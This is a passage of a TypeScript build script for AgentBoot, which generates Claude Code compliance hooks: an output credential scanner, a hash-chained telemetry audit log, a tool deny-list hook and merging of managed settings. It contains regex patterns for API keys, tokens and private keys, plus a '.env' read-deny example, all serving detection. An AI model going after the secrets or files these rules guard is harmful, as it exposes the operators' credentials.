# Generated by AgentBoot. Do not edit manually.

set -uo pipefail
HOME="\${HOME:-\${USERPROFILE:-$(node -e "console.log(require('os').homedir())")}}"
command -v node >/dev/null 2>&1 || exit 0

${hookInputCapPrelude({
    // This hook fails OPEN by design (a Stop hook that blocks on its own failure
    // strands the session). Say so — an unscanned response must not look clean.
    overCapStderr:
      "response payload exceeds $MAX_HOOK_INPUT_BYTES bytes — output scan SKIPPED for this turn.",
    action: "exit0",
  })}
RESPONSE=$(printf '%s' "$INPUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{const j=JSON.parse(d);if(typeof j.last_assistant_message==='string'&&j.last_assistant_message){process.stdout.write(j.last_assistant_message);return;}if(j.transcript_path){const fs=require('fs');const lines=fs.readFileSync(j.transcript_path,'utf-8').split('\\n');for(let i=lines.length-1;i>=0;i--){const l=lines[i].trim();if(!l)continue;try{const e=JSON.parse(l);const m=(e.message&&e.message.role==='assistant')?e.message:null;if(m){const c=m.content;const t=typeof c==='string'?c:(Array.isArray(c)?c.filter(p=>p&&p.type==='text').map(p=>p.text).join('\\n'):'');process.stdout.write(t);return;}}catch(_){}}}process.stdout.write('');}catch(_){process.stdout.write('')}})") || exit 0

# Scan for accidental credential exposure in output
PATTERNS=(
  'AKIA[A-Z0-9]{16}'
  'sk-[a-zA-Z0-9]{20,}'
  'ghp_[a-zA-Z0-9]{36}'
  'eyJ[a-zA-Z0-9_-]{10,}\\.eyJ'
  'xox[bp]-[a-zA-Z0-9-]+'
  'sk_live_[a-zA-Z0-9]+'
  'BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY'
)

MATCHED=0
for pattern in "\${PATTERNS[@]}"; do
  if printf '%s' "$RESPONSE" | grep -qiE "$pattern"; then
    MATCHED=1
    break
  fi
done
${outputScanner ? `
# Org-supplied scanner (compliance.outputScan.scannerCommand).
# Contract: content on stdin; exit 0 = allow, exit 2 = block, other = scanner failure.
if [ "$MATCHED" -eq 0 ]; then
  SCAN_OUT=$(printf '%s' "$RESPONSE" | ${outputScanner} 2>&1)
  SCAN_STATUS=$?
  if [ "$SCAN_STATUS" -eq 2 ]; then
    echo "AgentBoot scanner: $SCAN_OUT" >&2
    MATCHED=1
  elif [ "$SCAN_STATUS" -ne 0 ]; then${outputFailClosed ? `
    echo "AgentBoot scanner failed (exit $SCAN_STATUS): $SCAN_OUT" >&2
    MATCHED=1` : `
    echo "AgentBoot: organization scanner failed (exit $SCAN_STATUS) — continuing on bundled patterns only (failMode: open)" >&2`}
  fi
fi
` : ""}
if [ "$MATCHED" -eq 1 ]; then${outputBlocking ? `
  echo '{"decision":"block","reason":"AgentBoot: potential credential or policy-flagged content detected in the response. Redact the flagged content, then finish again. (compliance.outputScan.blocking is enabled)"}'
  exit 2` : `
  echo "AgentBoot WARNING: Potential credential in output — review before sharing" >&2`}
fi

exit 0
`;

  // AB-63: Audit trail hook (SubagentStart/Stop, PostToolUse, SessionEnd)
  // Phase 11 A2: Replaced jq with node -e for Windows/git-bash portability
  // S2 fix: validate and sanitize telemetry.logPath
  let rawLogPath = config.telemetry?.logPath ?? "$HOME/.agentboot/telemetry.ndjson";
  // Normalize ~ to $HOME (~ is not expanded inside bash variable defaults)
  rawLogPath = rawLogPath.replace(/^~\//, "$HOME/");
  // Always reject path traversal
  if (/\.\./.test(rawLogPath)) {
    log(chalk.red(`  ✗ telemetry.logPath contains path traversal: ${rawLogPath}`));
    log(chalk.red(`    Use a simple path like ~/.agentboot/telemetry.ndjson`));
    process.exit(1);
  }
  // Allowlist approach: path must be $HOME (or ${HOME}) prefix + safe chars only
  const pathWithoutHome = rawLogPath.replace(/^(\$HOME|\$\{HOME\})/, "");
  if (!/^[/a-zA-Z0-9._-]*$/.test(pathWithoutHome)) {
    log(chalk.red(`  ✗ telemetry.logPath contains unsafe characters: ${rawLogPath}`));
    log(chalk.red(`    Use a simple path like ~/.agentboot/telemetry.ndjson`));
    process.exit(1);
  }

  const includeDevId = config.telemetry?.includeDevId ?? false;

  let devIdBlock = "";
  if (includeDevId === "hashed" || includeDevId === "email") {
    if (includeDevId === "email") {
      log(chalk.yellow(`  ⚠ telemetry.includeDevId "email" now defaults to hashed for privacy.`));
      log(chalk.yellow(`    Use "email-raw" to explicitly include raw emails (not recommended).`));
    }
    devIdBlock = `DEV_ID=$(git config user.email 2>/dev/null | shasum -a 256 | cut -d' ' -f1)`;
  } else if (includeDevId === "email-raw") {
    log(chalk.yellow(`  ⚠ telemetry.includeDevId is "email-raw" — raw emails will be in telemetry logs.`));
    log(chalk.yellow(`    Consider "hashed" for privacy compliance (GDPR, data minimization).`));
    devIdBlock = `DEV_ID=$(git config user.email 2>/dev/null || echo "unknown")`;
  } else {
    devIdBlock = `DEV_ID=""`;
  }

  // Phase 11 A2: Replaced jq with node -e for Windows/git-bash portability
  const auditTrailHook = `#!/bin/bash
# AgentBoot audit trail hook (AB-63)
# Events: SubagentStart, SubagentStop, PostToolUse, SessionEnd
# Generated by AgentBoot. Do not edit manually.

HOME="\${HOME:-\${USERPROFILE:-$(node -e "console.log(require('os').homedir())")}}"
command -v node >/dev/null 2>&1 || exit 0

TELEMETRY_LOG="\${AGENTBOOT_TELEMETRY_LOG:-${rawLogPath}}"
umask 077
mkdir -p "$(dirname "$TELEMETRY_LOG")"

${hookInputCapPrelude({
    // Non-blocking hook: record the event anyway, but never pretend the record
    // is complete.
    overCapStderr:
      "telemetry payload exceeds $MAX_HOOK_INPUT_BYTES bytes — event fields may be incomplete.",
    action: "continue",
  })}
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
${devIdBlock}

# Use node for safe JSON construction — prevents shell injection via agent_type/tool_name.
# D3: each event carries a hash-chain link (sha256 of the previous event's
# chain + this event's canonical content) so post-write edits, deletions and
# reordering of the local log are DETECTABLE (see docs: this is detection, not
# prevention — signed shipped batches are the tamper-evident control).
export TIMESTAMP DEV_ID TELEMETRY_LOG
printf '%s' "$INPUT" | node -e "
  const fs = require('fs');
  const { createHash } = require('crypto');
  const canonical = (v) => Array.isArray(v) ? '[' + v.map(canonical).join(',') + ']'
    : (v !== null && typeof v === 'object')
      ? '{' + Object.keys(v).sort().map(k => JSON.stringify(k) + ':' + canonical(v[k])).join(',') + '}'
      : JSON.stringify(v);
  let d='';
  process.stdin.on('data',c=>d+=c);
  process.stdin.on('end',()=>{
    try {
      const input = JSON.parse(d);
      const event = input.hook_event_name || '';
      const ts = process.env.TIMESTAMP || new Date().toISOString();
      const dev = process.env.DEV_ID || '';
      let entry = null;
      if (event === 'SubagentStart') {
        entry = {event:'persona_invocation',persona_id:input.agent_type||'',timestamp:ts,status:'started',dev_id:dev,schema:2};
      } else if (event === 'SubagentStop') {
        entry = {event:'persona_invocation',persona_id:input.agent_type||'',timestamp:ts,status:'completed',dev_id:dev,schema:2};
      } else if (event === 'PostToolUse') {
        entry = {event:'hook_execution',persona_id:input.agent_type||'',tool_name:input.tool_name||'',timestamp:ts,dev_id:dev,schema:2};
      } else if (event === 'SessionEnd') {
        entry = {event:'session_summary',timestamp:ts,dev_id:dev,schema:2};
      }
      if (!entry) return;
      const log = process.env.TELEMETRY_LOG;
      let prev = 'agentboot-telemetry-genesis';
      try {
        const lines = fs.readFileSync(log,'utf-8').trim().split('\\n');
        const last = JSON.parse(lines[lines.length-1]);
        if (typeof last.chain === 'string') prev = last.chain;
      } catch {}
      entry.chain = createHash('sha256').update(prev + canonical(entry)).digest('hex');
      fs.appendFileSync(log, JSON.stringify(entry) + '\\n', { mode: 0o600 });
    } catch {}
  });
"

exit 0
`;

  // AB-122: PreToolUse compliance hook — block denied tool patterns
  const denyTools = config.managed?.guardrails?.denyTools ?? [];
  let preToolUseHook = "";
  if (denyTools.length > 0) {
    // Validate denyTools patterns — must be safe identifiers (no shell metacharacters)
    for (const p of denyTools) {
      if (!/^[a-zA-Z0-9._*?-]+$/.test(p)) {
        log(chalk.red(`  ✗ managed.guardrails.denyTools contains unsafe pattern: "${p}"`));
        log(chalk.red(`    Patterns must match [a-zA-Z0-9._*?-]+ (tool names and glob chars only)`));
        // The message was accurate about what is wrong but silent about where the
        // rejected form belongs, leaving the operator with no way to discover the
        // right key. Path-scoped denies are a permissions concern, not a tool-name one.
        log(chalk.yellow(`    For a path-scoped deny like "Read(**/.env)", use claude.permissions.deny instead.`));
        process.exit(1);
      }
    }
    const patterns = denyTools.map(p => `  '${p.replace(/'/g, "'\\''")}'`).join("\n");
    // Phase 11 A2: Replaced jq with node -e for Windows/git-bash portability
    preToolUseHook = `#!/bin/bash
# AgentBoot compliance hook — PreToolUse tool blocking (AB-122)
# Event: PreToolUse
# Generated by AgentBoot. Do not edit manually.

set -uo pipefail
HOME="\${HOME:-\${USERPROFILE:-$(node -e "console.log(require('os').homedir())")}}"
# Fail-closed: if node is missing, block the tool (compliance requires enforcement)
command -v node >/dev/null 2>&1 || { echo '{"decision":"block","reason":"AgentBoot: node required for compliance hooks"}'; exit 2; }

${hookInputCapPrelude({
    overCapStderr: "tool payload exceeds $MAX_HOOK_INPUT_BYTES bytes — cannot identify the tool.",
    action: "block",
    blockReason:
      "AgentBoot: tool-use payload exceeds the hook input limit and could not be inspected.",
  })}
TOOL_NAME=$(printf '%s' "$INPUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{const j=JSON.parse(d);process.stdout.write(j.tool_name||'')}catch{process.stdout.write('')}})") || { echo '{"decision":"block","reason":"AgentBoot: Failed to parse hook input"}'; exit 2; }

DENY_PATTERNS=(
${patterns}
)

for pattern in "\${DENY_PATTERNS[@]}"; do
  # RHS is intentionally UNQUOTED so bash treats it as a glob — denyTools patterns
  # may contain * and ? (e.g. "mcp__*", "Bash*"). Values are validated at compile
  # time to [a-zA-Z0-9._*?-]+, so there is nothing unsafe to word-split here.
  if [[ "$TOOL_NAME" == $pattern ]]; then
    echo "{\\"decision\\":\\"block\\",\\"reason\\":\\"AgentBoot: Tool \\\\\\"$TOOL_NAME\\\\\\" is blocked by organization policy.\\"}"
    exit 2
  fi
done

exit 0
`;
  }

  const scripts: HookScript[] = [
    { name: "agentboot-input-scan.sh", content: inputScanHook },
    { name: "agentboot-output-scan.sh", content: outputScanHook },
    { name: "agentboot-telemetry.sh", content: auditTrailHook },
  ];
  if (preToolUseHook) {
    scripts.push({ name: "agentboot-pretooluse.sh", content: preToolUseHook });
  }
  return scripts;
}

/**
 * Write the compliance hook scripts into Claude Code's dist tree (and the plugin
 * tree). Codex and Copilot generate their own copies from the same scripts.
 */
function generateComplianceHooks(
  distPath: string,
  scopePath: string,
  scripts: HookScript[],
): void {
  writeHookScripts(scripts, path.join(distPath, "claude", scopePath, "hooks"));

  // Also generate the plugin hooks
  if (fs.existsSync(path.join(distPath, "plugin"))) {
    writeHookScripts(scripts, path.join(distPath, "plugin", "hooks"));
  }

  const names = scripts.map((s) => s.name.replace(/^agentboot-|\.sh$/g, "")).join(", ");
  log(chalk.gray(`  → Compliance hooks written (${names})`));
}

// ---------------------------------------------------------------------------
// AB-59/60/63: Generate settings.json hooks entries for compliance
// ---------------------------------------------------------------------------

function generateComplianceSettingsJson(
  _config: AgentBootConfig,
  distPath: string,
  scopePath: string
): void {
  // Read existing settings.json if any, merge compliance hooks into it
  const settingsPath = path.join(distPath, "claude", scopePath, "settings.json");
  let settings: Record<string, unknown> = {};
  if (fs.existsSync(settingsPath)) {
    try {
      settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8"));
    } catch { /* start fresh */ }
  }

  // Strip any previously compiled compliance hooks so each build starts clean.
  // This prevents hook entries from accumulating across repeated agentboot build
  // runs (each run would otherwise append a new copy of every compliance hook).
  // User-defined hooks (those without an agentboot-*.sh command) are preserved.
  const AGENTBOOT_HOOK_PATTERN = /agentboot-[a-z-]+\.sh$/;
  const rawHooks = (settings["hooks"] ?? {}) as Record<string, unknown[]>;
  const hooks: Record<string, unknown[]> = {};
  for (const [event, entries] of Object.entries(rawHooks)) {
    const userEntries = (Array.isArray(entries) ? entries : []).filter((e) => {
      const eHooks = (e as Record<string, unknown[]>)?.["hooks"];
      if (!Array.isArray(eHooks) || eHooks.length === 0) return true;
      const cmd = String((eHooks[0] as Record<string, unknown>)?.["command"] ?? "");
      return !AGENTBOOT_HOOK_PATTERN.test(cmd);
    });
    if (userEntries.length > 0) hooks[event] = userEntries;
  }

  // B1 fix: append compliance hooks instead of overwriting user-defined hooks
  const appendHook = (event: string, entry: unknown) => {
    hooks[event] = [
      ...(Array.isArray(hooks[event]) ? hooks[event] as unknown[] : []),
      entry,
    ];
  };

  // Derive the CC wiring from the canonical bindings (input-scan → UserPromptSubmit,
  // output-scan → Stop, telemetry → SubagentStart/Stop + PostToolUse + SessionEnd,
  // pretooluse → PreToolUse only when denyTools is configured). CC event names are
  // canonical, timeouts in ms, matcher exact-match.
  const denyOn = (_config.managed?.guardrails?.denyTools ?? []).length > 0;
  for (const b of COMPLIANCE_HOOK_BINDINGS) {
    if (b.requiresDenyTools && !denyOn) continue;
    appendHook(b.ccEvent, {
      matcher: b.matcher,
      hooks: [{
        type: "command",
        command: `.claude/hooks/${b.script}`,
        timeout: b.timeoutMs,
        ...(b.async ? { async: true } : {}),
      }],
    });
  }

  settings["hooks"] = hooks;
  fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2) + "\n", "utf-8");
}

// ---------------------------------------------------------------------------
// AB-147: Per-persona hook compilation
// ---------------------------------------------------------------------------

/**
 * Compile per-persona hooks from persona.config.json into settings.json.
 * Each persona can define hooks that fire when that persona is invoked as a subagent.
 * Also compiles gotcha-derived path protection hooks.
 */
function generatePersonaHooks(
  _config: AgentBootConfig,
  distPath: string,
  scopePath: string,
  personaDirs: Map<string, string>,
  enabledPersonas: string[] | undefined
): void {
  const settingsPath = path.join(distPath, "claude", scopePath, "settings.json");
  let settings: Record<string, unknown> = {};
  if (fs.existsSync(settingsPath)) {
    try {
      settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8"));
    } catch { /* start fresh */ }
  }

  const hooks = (settings["hooks"] ?? {}) as Record<string, unknown[]>;
  let personaHooksAdded = 0;

  for (const [personaName, personaDir] of personaDirs) {
    if (enabledPersonas && !enabledPersonas.includes(personaName)) continue;
    const pc = loadPersonaConfig(personaDir);
    if (!pc?.hooks) continue;

    // Merge persona-specific hooks into the settings
    for (const [event, hookConfig] of Object.entries(pc.hooks)) {
      if (!hooks[event]) hooks[event] = [];
      // Wrap in SubagentStart matcher so hooks only fire for this persona.
      // Spread config first, then enforce matcher — persona can't override its own matcher.
      const entry = {
        ...(typeof hookConfig === "object" && hookConfig !== null ? hookConfig : {}),
        matcher: personaName,
      };
      (hooks[event] as unknown[]).push(entry);
      personaHooksAdded++;
    }
  }

  // AB-147: Compile gotcha path patterns into PreToolUse validation
  // Gotchas with paths: frontmatter can generate hooks that warn on edits to sensitive paths
  const gotchasDir = path.join(HUB_ROOT, "core", "gotchas");
  if (fs.existsSync(gotchasDir)) {
    const gotchaFiles = fs.readdirSync(gotchasDir).filter(f => f.endsWith(".md") && f !== "README.md");
    const sensitiveGlobs: string[] = [];

    for (const file of gotchaFiles) {
      const content = fs.readFileSync(path.join(gotchasDir, file), "utf-8");
      const fm = parseFrontmatter(content);
      const rawPaths = fm?.get("paths");
      if (rawPaths) {
        const pathsStr = rawPaths.replace(/^["']|["']$/g, "");
        sensitiveGlobs.push(...pathsStr.split(",").map(p => p.trim()).filter(Boolean));
      }
    }

    if (sensitiveGlobs.length > 0) {
      // Generate a PostToolUse hook that logs when gotcha-scoped files are edited
      if (!hooks["PostToolUse"]) hooks["PostToolUse"] = [];
      (hooks["PostToolUse"] as unknown[]).push({
        matcher: `Edit|Write`,
        hooks: [{
          type: "command",
          command: `.claude/hooks/agentboot-telemetry.sh`,
          timeout: 3000,
          async: true,
        }],
        // Comment: gotcha-scoped paths trigger telemetry for audit
        _agentboot_gotcha_paths: sensitiveGlobs,
      });
    }
  }

  if (personaHooksAdded > 0 || Object.keys(hooks).length > 0) {
    settings["hooks"] = hooks;
    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2) + "\n", "utf-8");
    if (personaHooksAdded > 0) {
      log(chalk.gray(`  → ${personaHooksAdded} persona-specific hook(s) compiled`));
    }
  }
}

// ---------------------------------------------------------------------------
// AB-64: Telemetry NDJSON schema file
// ---------------------------------------------------------------------------

function generateTelemetrySchema(distPath: string): void {
  // v0.16.0 hardening: the schema artifact is DERIVED from the canonical
  // event spec (scripts/lib/telemetry-schema.ts) — previously a second,
  // hand-written schema shipped here that rejected the product's own
  // session_summary events and permitted fields the hooks never emit.
  const schema = buildTelemetryJsonSchema();

  const schemaDir = path.join(distPath, "schema");
  ensureDir(schemaDir);
  fs.writeFileSync(
    path.join(schemaDir, `telemetry-event.v${TELEMETRY_SCHEMA_VERSION}.json`),
    JSON.stringify(schema, null, 2) + "\n",
    "utf-8"
  );
  log(chalk.gray(`  → Telemetry schema written to dist/schema/ (generated from the canonical event spec)`));
}

// ---------------------------------------------------------------------------
// AB-61: Managed settings artifact generation
// ---------------------------------------------------------------------------

/**
 * B8: Merge managed-settings fragments into ONE deployable artifact per scope.
 *
 * The `managed-settings.d/` fragments (00-org / 10-group / 20-team) are
 * composition INPUTS; an MDM operator deploys a single file per fleet
 * segment. This emits that file to dist/managed/scopes/<scope>/managed-settings.json.
 *
 * Merge semantics (documented in configuration.md):
 *   - `permissions.deny`: UNION across scopes — a lower scope can add denies,
 *     never remove the org's.
 *   - `permissions.allow`: UNION — teams may extend what they allow.
 *   - every other key: the HIGHER scope wins (org over group over team).
 *   - "// source" comment keys are dropped from the merged artifact.
 */
function generateMergedManagedArtifacts(
  distPath: string,
  nodePaths: string[],
  config: AgentBootConfig,
): void {
  const readFragment = (p: string): Record<string, unknown> | null => {
    if (!fs.existsSync(p)) return null;
    try { return JSON.parse(fs.readFileSync(p, "utf-8")) as Record<string, unknown>; }
    catch { return null; }
  };

  // Org-level inputs: the guardrail-derived deployable + the org fragment.
  const guardrailBase = readFragment(path.join(distPath, "managed", "managed-settings.json")) ?? {};
  const orgFragment = readFragment(path.join(distPath, "claude", "core", "managed-settings.d", "00-org.json")) ?? {};

  // F-5: the acknowledgement register.
  //
  // D3 corrects this comment, which was false. `hooks` is unioned wholesale, so
  // it genuinely never appears here. `permissions` is NOT — only
  // `permissions.deny` and `permissions.allow` are unioned. Every other sub-key
  // (`defaultMode`, `additionalDirectories`, `bypassPermissions`, anything added
  // upstream later) is a shallow overwrite like any scalar, and now appears here
  // as `permissions.<sub-key>` when scopes disagree about it.
  const acknowledgedOverrides = config.managed?.scopeMerge?.acknowledgedOverrides ?? [];
  if (acknowledgedOverrides.includes("*")) {
    fatal(
      "managed.scopeMerge.acknowledgedOverrides may not contain \"*\".\n" +
      "  The point is that each accepted loss is ENUMERATED and reviewable in the hub PR diff.",
    );
  }

  const allConflicts: Array<{ scope: string; conflict: MergeConflict }> = [];
  const allMalformedHooks: Array<{ scope: string; hook: MalformedHook }> = [];

  const writeMerged = (scope: string, result: MergeResult, sources: string[]): void => {
    for (const c of result.conflicts) allConflicts.push({ scope: `scopes/${scope}`, conflict: c });
    for (const h of result.malformedHooks) allMalformedHooks.push({ scope: `scopes/${scope}`, hook: h });
    if (Object.keys(result.merged).length === 0) return;
    const outDir = path.join(distPath, "managed", "scopes", scope);
    ensureDir(outDir);
    fs.writeFileSync(
      path.join(outDir, "managed-settings.json"),
      JSON.stringify(result.merged, null, 2) + "\n",
      "utf-8"
    );
    log(chalk.gray(`  → Merged managed artifact: scopes/${scope} (${sources.join(" + ")})`));
    // Silence Is Not Success: a successful merge reports the composition it
    // PERFORMED, not merely that it happened.
    if (result.unionedHookEvents.length > 0) {
      log(chalk.gray(
        `      hooks unioned across ${result.unionedHookEvents.length} event(s): ${result.unionedHookEvents.join(", ")}`,
      ));
    }
    const { deny, allow } = result.permissionCounts;
    if (deny > 0 || allow > 0) {
      log(chalk.gray(`      permissions.deny unioned: ${deny} rule(s) · permissions.allow unioned: ${allow} rule(s)`));
    }
  };

  // Core scope: guardrail base wins over the org fragment (both org-authored;
  // the guardrail channel is the harder statement of intent).
  writeMerged("core", mergeManagedFragments([guardrailBase, orgFragment], ["guardrails", "00-org"]), ["guardrails", "00-org"]);

  for (const nodePath of nodePaths) {
    const parts = nodePath.split("/");
    const fragments: Array<Record<string, unknown>> = [guardrailBase, orgFragment];
    const sources = ["guardrails", "00-org"];
    // Walk down the scope chain: group fragment, then team fragment.
    for (let depth = 1; depth <= parts.length; depth++) {
      const ancestor = parts.slice(0, depth).join("/");
      const fragName = depth === 1 ? "10-group.json" : "20-team.json";
      const frag = readFragment(path.join(distPath, "claude", `nodes/${ancestor}`, "managed-settings.d", fragName));
      if (frag) {
        fragments.push(frag);
        sources.push(`${fragName.replace(".json", "")}(${ancestor})`);
      }
    }
    if (fragments.length > 2) {
      writeMerged(`nodes/${nodePath}`, mergeManagedFragments(fragments, sources), sources);
    }
  }

  // D1: a hook event that could not be unioned is a DELETED control on the
  // non-overridable channel. Fail the build, naming the scope, the event and the
  // fragment — never write the artifact and report a union that did not happen.
  if (allMalformedHooks.length > 0) {
    log(chalk.red(`\n  ✗ Malformed hook event(s) in managed-settings fragments — cannot be merged:`));
    for (const { scope, hook } of allMalformedHooks) {
      log(chalk.red(`      ${scope}: hooks.${hook.event} is ${hook.found}, expected an array — from ${hook.source}`));
    }
    log(chalk.gray(`    dist/managed/scopes/<scope>/managed-settings.json is the file an MDM operator`));
    log(chalk.gray(`    deploys and a developer CANNOT override. Silently dropping the event would`));
    log(chalk.gray(`    write the ABSENCE of a control into that file, while the build log named the`));
    log(chalk.gray(`    event as unioned. Fix the fragment; there is no safe default here.`));
    process.exit(1);
  }

  // F-5 §2.2: report every scope in ONE run. An operator with a conflict in
  // scopes/core and scopes/nodes/platform/api should see both, not fix them one
  // build at a time.
  if (allConflicts.length === 0) return;

  const unacked = allConflicts.filter((c) => !acknowledgedOverrides.includes(c.conflict.key));
  const acked = allConflicts.filter((c) => acknowledgedOverrides.includes(c.conflict.key));

  const fmt = (v: unknown) => JSON.stringify(v);

  for (const { scope, conflict } of acked) {
    // An acknowledged loss is STILL a loss — name winner, loser and both sources.
    for (const d of conflict.discarded) {
      log(chalk.yellow(
        `  ⚠ ${scope}: ${conflict.key} — kept ${fmt(conflict.keptValue)} (${conflict.keptSource}), ` +
        `discarded ${fmt(d.value)} (${d.source}) — acknowledged in managed.scopeMerge.acknowledgedOverrides.`,
      ));
    }
  }

  if (unacked.length === 0) return;

  for (const { scope, conflict } of unacked) {
    log("");
    log(chalk.red(`  ✗ Managed scope merge discards a configured value: ${scope}`));
    log(chalk.red(`      ${conflict.key}`));
    log(chalk.gray(`        kept      ${fmt(conflict.keptValue)}  (from ${conflict.keptSource})`));
    for (const d of conflict.discarded) {
      log(chalk.gray(`        discarded ${fmt(d.value)}  (from ${d.source})`));
    }
  }
  log("");
  log(chalk.gray(
    `    dist/managed/scopes/<scope>/managed-settings.json is the file your MDM deploys and a`,
  ));
  log(chalk.gray(
    `    developer cannot override. A value dropped here is a control that was authored,`,
  ));
  log(chalk.gray(`    validated and signed, and enforces nothing.`));
  // The F-1 interaction: the guardrail base is read from DISK, so a hub that
  // once set managed.enabled and later cleared it used to merge a stale base.
  // Staging fixes that, but say so if the shape still appears.
  if (!config.managed?.enabled) {
    log(chalk.gray(
      `    NOTE: managed.enabled is not set, yet a guardrail base was present — if dist/ predates`,
    ));
    log(chalk.gray(`    this release, the remedy is \`rm -rf dist\`, not an acknowledgement.`));
  }
  log("");
  log(chalk.gray(`    Fix by making the two scopes agree, or — if the override is intended — add`));
  log(chalk.gray(`    to agentboot.config.json:`));
  log(chalk.gray(
    `      "managed": { "scopeMerge": { "acknowledgedOverrides": [${[...new Set(unacked.map((c) => `"${c.conflict.key}"`))].join(", ")}] } }`,
  ));
  log("");
  log(chalk.red(
    `  ✗ Build failed: ${unacked.length} key(s) discarded by the managed scope merge ` +
    `(${[...new Set(unacked.map((c) => c.scope))].join(", ")}).`,
  ));
  log("");
  process.exit(1);
}

/**
 * UI-7: resolve a scope node's persona source directory. ONE resolver, used by
 * every consumer, honoring every documented layout:
 *   1. nodes/<path>/personas/            (canonical, AB-88)
 *   2. groups/<g>/teams/<t>/personas/    (nested legacy — what validate always walked)
 *   3. teams/<g>/<t>/personas/           (sibling legacy)
 *   4. groups/<g>/personas/              (group scope)
 * Before this, validate enforced layout 2 while compile only discovered 1/3/4 —
 * the same hub content was guarded by one command and invisible to the other.
 */
function resolveNodePersonasDir(hubRoot: string, nodePath: string): string | null {
  const parts = nodePath.split("/");
  const candidates: Array<string | undefined> = [
    path.join(hubRoot, "nodes", nodePath, "personas"),
    parts.length === 2 ? path.join(hubRoot, "groups", parts[0]!, "teams", parts[1]!, "personas") : undefined,
    parts.length === 2 ? path.join(hubRoot, "teams", parts[0]!, parts[1]!, "personas") : undefined,
    parts.length === 1 ? path.join(hubRoot, "groups", parts[0]!, "personas") : undefined,
  ];
  for (const c of candidates) {
    if (c && fs.existsSync(c)) return c;
  }
  return null;
}

/** UI-8: all existing scope ROOT dirs for a node (any accepted layout). */
function listNodeScopeRoots(hubRoot: string, nodePath: string): string[] {
  const parts = nodePath.split("/");
  const candidates: Array<string | undefined> = [
    path.join(hubRoot, "nodes", nodePath),
    parts.length === 2 ? path.join(hubRoot, "groups", parts[0]!, "teams", parts[1]!) : undefined,
    parts.length === 2 ? path.join(hubRoot, "teams", parts[0]!, parts[1]!) : undefined,
    parts.length === 1 ? path.join(hubRoot, "groups", parts[0]!) : undefined,
  ];
  return candidates.filter((c): c is string => c !== undefined && fs.existsSync(c));
}

function generateManagedSettings(
  config: AgentBootConfig,
  distPath: string,
  outputFormats: readonly string[],
): void {
  const managed = config.managed;
  if (!managed?.enabled) return;

  // B4 / H4: `dist/managed/` is the Claude Code MDM channel, and nothing else
  // consumes it. This call was UNGATED, so a hub with no `claude` target still
  // got a managed-settings.json — and, with `requireAuditLog`, one referencing
  // `.claude/hooks/agentboot-telemetry.sh`, a hook that build never produced.
  // The operator was then told "→ Managed settings written to dist/managed/"
  // and "→ Target MDM path: /Library/Application Support/Claude/", i.e. handed
  // a deployable artifact pointing at a script that does not exist.
  //
  // Erroring rather than skipping: `managed.enabled` is a configured control,
  // and a control that reaches no platform is the exact class the capability
  // gate exists to fail on. Skipping quietly would put this back in the
  // "emitted nothing, said nothing" bucket.
  if (!outputFormats.includes("claude")) {
    log(chalk.red(`\n  ✗ managed.enabled is set, but \`claude\` is not in personas.outputFormats.`));
    log(chalk.gray(`    dist/managed/ is the Claude Code managed-settings (MDM) channel — no other`));
    log(chalk.gray(`    platform consumes it, and managed.guardrails.requireAuditLog writes a hook`));
    log(chalk.gray(`    path of .claude/hooks/agentboot-telemetry.sh — a location this build does not`));
    log(chalk.gray(`    produce (a codex-only build puts its hooks under .codex/hooks/).`));
    log(chalk.gray(`    Fix: add "claude" to personas.outputFormats, or remove managed.enabled.`));
    process.exit(1);
  }

  log(chalk.cyan("\nGenerating managed settings..."));

  const managedDir = path.join(distPath, "managed");
  ensureDir(managedDir);

  // Managed settings carry HARD guardrails plus any pass-through settings keys
  const managedSettings: Record<string, unknown> = {};

  // Arbitrary-key pass-through (claude.settings) first — lets an org reproduce an
  // existing hand-written managed settings file 1:1 (enableAllProjectMcpServers,
  // enabled/disabledMcpjsonServers, env, cleanupPeriodDays, includeCoAuthoredBy, ...).
  // Guardrail-derived keys below win on collision.
  if (config.claude?.settings) Object.assign(managedSettings, config.claude.settings);

  // Permissions: deny dangerous tools
  if (managed.guardrails?.denyTools && managed.guardrails.denyTools.length > 0) {
    managedSettings["permissions"] = {
      deny: managed.guardrails.denyTools,
    };
  }

  // Force audit logging
  if (managed.guardrails?.requireAuditLog) {
    managedSettings["hooks"] = {
      SubagentStart: [
        {
          matcher: "",
          hooks: [{ type: "command", command: ".claude/hooks/agentboot-telemetry.sh", timeout: 3000, async: true }],
        },
      ],
      SubagentStop: [
        {
          matcher: "",
          hooks: [{ type: "command", command: ".claude/hooks/agentboot-telemetry.sh", timeout: 3000, async: true }],
        },
      ],
    };
  }

  fs.writeFileSync(
    path.join(managedDir, "managed-settings.json"),
    JSON.stringify(managedSettings, null, 2) + "\n",
    "utf-8"
  );

  // Managed CLAUDE.md (minimal, HARD guardrails only)
  const managedClaudeMd = [
    `# ${config.orgDisplayName ?? config.org} — Managed Configuration`,
    "",
    "<!-- Managed by IT. Do not modify. -->",
    "",
    "This configuration is enforced by your organization's IT policy.",
    "Contact your platform team for changes.",
    "",
  ].join("\n");

  fs.writeFileSync(path.join(managedDir, "CLAUDE.md"), managedClaudeMd, "utf-8");

  // MCP config if needed
  if (config.claude?.mcpServers) {
    fs.writeFileSync(
      path.join(managedDir, "managed-mcp.json"),
      JSON.stringify({ mcpServers: config.claude.mcpServers }, null, 2) + "\n",
      "utf-8"
    );
  }

  // Output path guidance
  const platformPaths: Record<string, string> = {
    jamf: "/Library/Application Support/Claude/",
    intune: "C:\\ProgramData\\Claude\\",
    jumpcloud: "/etc/claude-code/",
    kandji: "/Library/Application Support/Claude/",
    other: "./managed-output/",
  };
  const platform = managed.platform ?? "other";
  const targetPath = platformPaths[platform] ?? platformPaths["other"];

  log(chalk.gray(`  → Managed settings written to dist/managed/`));
  log(chalk.gray(`  → Target MDM path: ${targetPath}`));
}

// ---------------------------------------------------------------------------
// Main entry point
// ---------------------------------------------------------------------------

function main(): void {
  const argv = process.argv.slice(2);
  const configPath = resolveConfigPath(argv, ROOT);

  log(chalk.bold("\nAgentBoot — compile"));
  log(chalk.gray(`Config: ${configPath}\n`));

  const config = loadConfig(configPath);
